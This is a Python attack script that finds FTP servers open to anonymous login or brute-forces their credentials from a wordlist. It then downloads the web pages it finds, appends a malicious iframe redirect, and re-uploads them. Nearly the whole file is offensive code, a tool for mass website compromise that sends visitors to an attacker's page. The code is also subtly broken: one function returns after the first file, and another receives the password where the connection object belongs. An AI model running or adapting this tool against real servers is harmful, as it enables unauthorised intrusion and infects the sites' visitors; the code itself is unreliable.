import ftplib
import time
import optparse
def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print(f"\n[+] {hostname} FTP Anonymous login succeeded")
        ftp.quit()
        return True
    except Exception as e:
        print(f"\n[-] {hostname} FTP Anonymous login failed")
        return False


#Format for this requires the wordlist to be stored as username:password
def bruteLogin(hostname, wordlist):
    try:
        wl = open(wordlist, 'r')
        for line in wl.readlines():
            uname = line.split(':')[0]
            pw = line.split(':')[1].strip('\r').strip('\n')
            print(f"[*] Trying {uname} and {pw}")
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(uname, pw)
                print(f"[+] FTP login succeeded with username = {uname} and password = {pw}")
                ftp.quit()
                return(uname, pw)
            except Exception as e:
                pass
    except Exception as exc:
        print("[-] Error with the wordlist, the format needs to be username:password")
    print("[-] Could not brute force FTP credentials")
    return (None, None)
def returnDefault(ftp):
    try:
        dir = ftp.nlst()
    except:
        dir = []
        print("[-] Could not list directory contents")
        print("[-] Skipping To Next Target.")
        return None
    results = []
    for file in dir:
        fn = file.lower()
        if ".php" in fn or ".htm" in fn or '.asp' in fn:
            print(f"[+] Found default page: {file}")
            results.append(fn)
        return results
def injectPage(ftp, page, redirect):
    f = open(page+".tmp", "w")
    ftp.retrlines('RETR '+page, f.write)
    print(f"[+] Fownloaded Page: {page}")
    f.write(redirect)
    f.close()
    print(f"[+] Injected Malicious IFrame on: {page}")
    ftp.storlines('STOR '+page, open(page+'.tmp'))
    print(f"[+] Uploaded Injected Page: {page}")

def attack(uname, pw, host, redirect):
    ftp = ftplib.FTP(host)
    ftp.login(uname, pw)
    dir = returnDefault(pw)
    if dir != None:
        print("[*] Trying to inject all pages with IFrame")
        for page in dir:
            injectPage(ftp, page, redirect)

def main():
    parser = optparse.OptionParser('usage%prog -H <target host[s]> -r <redirect page> [-f <userpass file>]')
    parser.add_option('-H', dest = 'host', type ='string', help= "Specify Target Host")
    parser.add_option('-f', dest="ws", type ="string", help ="Specify path to wordlist contaning usernames and passwords in the format: username:password)")
    parser.add_option("-r", dest="redirect", type="string", help="Specify a redirect page")
    (options, args) = parser.parse_args()
    hosts = str(options.host).split(', ')
    ws = options.ws
    redirect = options.redirect
    if hosts == None or redirect == None:
        print(parser.usage)
        exit(0)
    for host in hosts:
        uname = None
        pw = None
        if anonLogin(host) == True:
            uname = "anonymous"
            pw = "me@your.com"
            print("[+] Using Anonymous Credentials Attack")
            attack(uname, pw, host, redirect)
        elif ws != None:
            (uname, pw) = bruteLogin(host, ws)
        if pw != None:
            print(f"[+] Using Credentials: {uname} {pw} to attack")
            attack(uname, pw, host, redirect)
if __name__ == '__main__':
    main()